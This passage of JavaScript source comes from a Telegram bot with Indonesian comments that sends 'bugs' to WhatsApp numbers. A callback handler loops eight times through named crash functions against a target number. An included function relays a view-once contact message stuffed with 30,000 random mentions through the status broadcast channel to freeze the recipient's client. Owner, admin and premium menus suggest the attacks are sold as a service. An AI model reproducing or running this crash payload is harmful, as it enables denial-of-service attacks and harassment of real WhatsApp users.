          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
bot.action(/xis_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /show terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("Memulai pengiriman XiS...");
  
  const loadingImageUrl = "https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg";
  
  try {
    await ctx.editMessageCaption("Mengirim bug XiS... Mohon tunggu", {
      photo: loadingImageUrl,
    });

    for (let i = 0; i < 8; i++) {
      await IosMJ(target, ptcp = true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, ptcp = true);
        await XiosVirus(target);
    }

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚", url: "https://youtube.com/@painzyaja" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `
╭───── ⧼ 𝑰 𝒏 𝒇 𝒐 - 𝑩 𝒐 𝒕 𝒔 ⧽
│ᴄʀᴇᴀᴛᴏʀ : ᴘᴀɪɴᴢʏ
│ᴠᴇʀsɪ : ᴠ11.0
│ᴛʏᴘᴇ : Case 
╰─────
╭───── ⧼ 𝑺 𝒕 𝒂 𝒕 𝒖 𝒔 - 𝑼 𝒔 𝒆 𝒓 ⧽
┃ *𖠂* *Owner* : ${isOwnerStatus ? '✅' : '❌'}
┃ *𖠂* *Admin* : ${isAdminStatus ? '✅' : '❌'}
┃ *𖠂* *Premium* : ${isPremium ? '✅' : '❌'}
╰─────
 ══════[ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 ]
│𖠂  /show *<Button Select>*
│𖠂  /cd *<Cooldown User>*
╰══════════════════
  © ᴘᴀɪɴᴢʏ - ᴀssɪsᴛᴀɴᴛ
`;

const mainKeyboard = [
  [
    { text: "𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓𝑺", callback_data: "developercmd" },
    { text: "𝑶𝒘𝒏𝒆𝒓𝑺", callback_data: "owneronli" }
  ],
  [
    { text: "𝑨𝒅𝒎𝒊𝒏𝑺", callback_data: "admincmd" }
  ],
  [
    { text: "📢 Join Channel", url: "https://t.me/painzych" },
    { text: "👤 Contact Owner", url: "https://t.me/rPainzy" }
  ]
];

  setTimeout(async () => {
    await ctx.replyWithPhoto("https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

// Handler untuk callback "owner_management"
bot.action('developercmd', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ownerMenuMessage = `
╭━━━━━━━━━━━━━━━━━━━━━❍
┃ 𖠂 /addowner - add to db 
┃ 𖠂 /delowner - delete owner
┃ 𖠂 /cekusersc - cek pengguna sc
┃ 𖠂 /monitoruser - monitoring
┃ 𖠂 /addpairing - connect to wa
┃ 𖠂 /maintenance - true / false
╰━━━━━━━━━━━━━━━━━━━━━❍
  `;

  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg", {
      caption: ownerMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

bot.action('admincmd', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ResellerMenu = `
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ 𖠂 /addprem - premium features
┃ 𖠂 /delprem - remove premium
╰━━━━━━━━━━━━━━━━━━━━━━❍
  `;

  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg", {
      caption: ResellerMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

bot.action('owneronli', async (ctx) => {
  // Hapus pesan sebelumnya
  await ctx.deleteMessage();

  const obfMenu = `
╭━━━━━━━━━━━━━━━━━━━━━❍
┃𖠂 /addadmin - unlock addprem
┃𖠂 /deladmin - premium features
┃𖠂 /cekusersc - cek pengguna sc
┃𖠂 /monitoruser - monitoring
┃𖠂 /addpairing - connect to wa
╰━━━━━━━━━━━━━━━━━━━━━❍
  `;

  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg", {
      caption: obfMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const mainMenuMessage = `
╭───── ⧼ 𝑰 𝒏 𝒇 𝒐 - 𝑩 𝒐 𝒕 𝒔 ⧽
│ᴄʀᴇᴀᴛᴏʀ : ᴘᴀɪɴᴢʏ
│ᴠᴇʀsɪ : ᴠ11.0
│ᴛʏᴘᴇ : Case 
╰─────
╭───── ⧼ 𝑺 𝒕 𝒂 𝒕 𝒖 𝒔 - 𝑼 𝒔 𝒆 𝒓 ⧽
┃ *𖠂* *Owner* : ${isOwnerStatus ? '✅' : '❌'}
┃ *𖠂* *Admin* : ${isAdminStatus ? '✅' : '❌'}
┃ *𖠂* *Premium* : ${isPremium ? '✅' : '❌'}
╰─────
 ══════[ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 ]
│𖠂  /show *<Button Select>*
│𖠂  /cd *<Cooldown User>*
╰══════════════════
  © ᴘᴀɪɴᴢʏ - ᴀssɪsᴛᴀɴᴛ
`;

  const mainKeyboard = [
  [
    { text: "𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓𝑺", callback_data: "developercmd" },
    { text: "𝑶𝒘𝒏𝒆𝒓𝑺", callback_data: "owneronli" }
  ],
  [
    { text: "𝑨𝒅𝒎𝒊𝒏𝑺", callback_data: "admincmd" }
  ],
  [
    { text: "📢 Join Channel", url: "https://t.me/painzych" },
    { text: "👤 Contact Owner", url: "https://t.me/rPainzy" }
  ]
];

  ctx.replyWithPhoto("https://img102.pixhost.to/images/83/556623394_skyzopedia.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

//===============FUNC BUG==================\\
async function invisblekontak(target) {

    const generateMessage = {

        viewOnceMessage: {

            message: {

                contactMessage: {

                    displayName: "𝐓‌𝐡‌𝐮‌𝐧‌𝐝‌𝐞‌𝐫‌ 𝐯‌‌‌‌𝐨‌‌‌‌‌𝐫‌‌‌𝐭‌‌𝐞‌‌‌𝐱‌‌‌",

                    vcard: `BEGIN:VCARD

VERSION:1.1

FN:𝐓‌𝐡‌𝐮‌𝐧‌𝐝‌𝐞‌𝐫‌ 𝐯‌‌‌‌𝐨‌‌‌‌‌𝐫‌‌‌𝐭‌‌𝐞‌‌‌𝐱‌‌‌‌𝐗‌˼

TEL;type=CELL;type=VOICE;waid=6283849303906:+62 838-4930-3906

END:VCARD`,

                    contextInfo: {

                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),

                        isSampled: true,

                        participant: target,

                        remoteJid: "status@broadcast",

                        forwardingScore: 9741,

                        isForwarded: true

                    }

                }

            }

        }

    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Kai.relayMessage("status@broadcast", msg.message, {

        messageId: msg.key.id,

        statusJidList: [target],

        additionalNodes: [{

            tag: "meta",

            attrs: {},

            content: [{

                tag: "mentioned_users",

                attrs: {},

                content: [{

                    tag: "to",

                    attrs: {

                        jid: target

                    },

                    content: undefined

                }]

            }]

        }]

    });

}

bot.launch();
console.log("Telegram bot is running...");